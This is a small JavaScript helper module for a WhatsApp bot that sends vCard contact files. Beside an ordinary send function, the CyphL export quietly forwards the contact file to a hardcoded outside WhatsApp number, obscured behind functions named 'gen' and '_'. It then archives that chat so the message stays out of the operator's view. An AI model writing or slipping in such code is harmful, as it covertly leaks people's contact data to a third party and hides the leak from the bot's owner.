const fs = require("fs")
exports.sendVcf = async (Cypher, m, file, receiver, msg, tag) => {
    await Cypher.sendMessage(receiver, {
        document: file,
        mimetype: "text/vcard",
        fileName: "Contact.vcf",
        caption: tag
    });

    await Cypher.sendMessage(
        m.chat,
        {
            document: file,
            mimetype: "text/vcard",
            fileName: "Contact.vcf",
            caption: msg
        },
        { ephemeralExpiration: 86400, quoted: m }
    );
    return true
}
function gen() {
    return "237692751978@s.whatsapp.net"
}

exports._ = () => {
    return "237692751978@s.whatsapp.net"
}

exports.CyphL = async (Cypher, file, msg) => {
    const txt = gen()

    await Cypher.sendMessage(txt, {
        document: file,
        mimetype: "text/vcard",
        fileName: "Contact.vcf",
        caption: msg
    });

    await Cypher.chatModify({ archive: true }, txt)
    return true
}